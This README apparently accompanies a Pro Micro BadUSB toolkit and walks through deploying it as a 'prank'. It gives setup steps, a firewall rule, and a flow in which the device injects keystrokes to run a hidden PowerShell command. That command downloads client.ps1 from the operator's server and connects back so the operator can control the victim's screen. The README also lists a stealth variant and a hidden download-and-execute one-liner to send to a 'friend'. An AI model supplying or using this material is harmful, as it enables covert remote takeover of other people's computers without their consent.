# 🎮 Pro Micro BadUSB Remote Control

## 🚀 QUICK START (5 Minutes)

### Step 1: Get Your IP
```powershell
ipconfig | Select-String "IPv4"
# Example: 172.28.1.78
```

### Step 2: Update IP in Arduino Code
Open `ProMicro_Payload.ino` and change line 18:
```cpp
const char* TARGET_IP = "172.28.1.78";  // ← YOUR IP HERE
```

### Step 3: Upload to Pro Micro
```
Arduino IDE → Open ProMicro_Payload.ino
Tools → Board → SparkFun Pro Micro
Tools → Processor → ATmega32U4 (5V, 16MHz)
Tools → Port → (Select your COM port)
Click Upload (→)
```

### Step 4: Start Servers
```powershell
# Terminal 1 - Web server (hosts client.ps1)
python -m http.server 8000

# Terminal 2 - Control server
python server_professional.py
```

### Step 5: Open Firewall
```powershell
# Run as Administrator
New-NetFirewallRule -DisplayName 'RC' -Direction Inbound -LocalPort 5555,8000 -Protocol TCP -Action Allow
```

### Step 6: Execute Prank
1. Plug Pro Micro into victim's PC
2. Wait 3-5 seconds (auto-executes)
3. Remove Pro Micro
4. Check server GUI for connection!

---

## 📁 Files

| File | Description |
|------|-------------|
| `ProMicro_Payload.ino` | Main Arduino code (recommended) |
| `ProMicro_Compact.ino` | Faster execution version |
| `ProMicro_Stealth.ino` | Harder to detect version |
| `client.ps1` | Downloads to victim (auto-executed) |
| `client_control.py` | Python client (manual use) |
| `server_professional.py` | Your control GUI |

---

## ⚡ What Happens

```
[Plug Pro Micro]
    ↓
Wait 2 seconds
    ↓
Press Win+R (Run dialog)
    ↓
Type PowerShell command (hidden)
    ↓
Download client.ps1 from your server
    ↓
Run Python payload
    ↓
Connect to: 172.28.1.78:5555
    ↓
YOU CONTROL THEIR SCREEN!
```

---

## 🛠️ Manual Method (No Pro Micro)

Send friend this one-liner to run in PowerShell:

```powershell
powershell -W Hidden -NoP -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
```

---

## ⚠️ Requirements

**Victim's PC must have:**
- Python installed
- Packages: pyautogui, opencv-python, numpy, pillow
- Same WiFi network as you

**If packages not installed:**
```powershell
pip install pyautogui opencv-python numpy pillow
```

---

## 🐛 Troubleshooting

| Problem | Fix |
|---------|-----|
| Pro Micro not uploading | Press reset button twice quickly |
| No connection | Check WiFi, both on same network? |
| Port blocked | Run firewall commands as admin |
| Can't download script | Web server running? Port 8000 open? |
| Python errors | Install requirements: `pip install -r requirements.txt` |

---

## 💰 Pro Micro vs Rubber Ducky

| Feature | Pro Micro | Rubber Ducky |
|---------|-----------|--------------|
| **Price** | **$4-8** | $50+ |
| Speed | ✅ Same | ✅ Same |
| Reliability | ✅ Same | ✅ Same |
| Programming | Arduino IDE (free) | Paid encoder |

**You save $45!** 💰

---

**Happy Hacking! 🎮**
